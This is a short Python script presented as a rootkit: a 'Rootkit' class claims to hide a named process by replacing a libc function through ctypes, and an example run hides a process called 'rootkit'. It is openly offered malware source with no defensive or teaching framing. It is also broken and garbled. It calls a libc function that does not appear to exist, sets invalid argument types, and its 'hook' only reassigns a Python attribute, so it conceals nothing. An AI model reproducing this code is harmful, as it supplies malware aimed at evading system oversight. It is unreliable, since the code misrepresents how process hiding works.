import os
import ctypes

class Rootkit:
    def __init__(self):
        self._ctypes_dll = ctypes.CDLL('libc.so')

    def hide_process(self, process_name):
        # Hooking
        original_getproc_list = self._ctypes_dll.getdtablebyname
        def hooked_getproc_list(*args):
            result = original_getproc_list(*args)
            # Filtering
            if process_name in [p[0] for p in result]:
                return None
            else:
                return list(filter(lambda x: x[0]!=process_name, result))
            
        self._ctypes_dll.getdtablebyname.argtypes = [None]
        self._ctypes_dll.getdtablebyname.restype = ctypes.c_int
        self._ctypes_dll.getdtablebyname = hooked_getproc_list

        # Hiding
        cleaned_process_list = self._ctypes_dll.getdtablebyname(process_name)
        return cleaned_process_list
    
if __name__ == '__main__':
    rootkit_obj = Rootkit()
    
    # Example usage - hides a process with the name "rootkit"
    cleaned_processes = rootkit_obj.hide_process("rootkit")

    print(cleaned_processes)

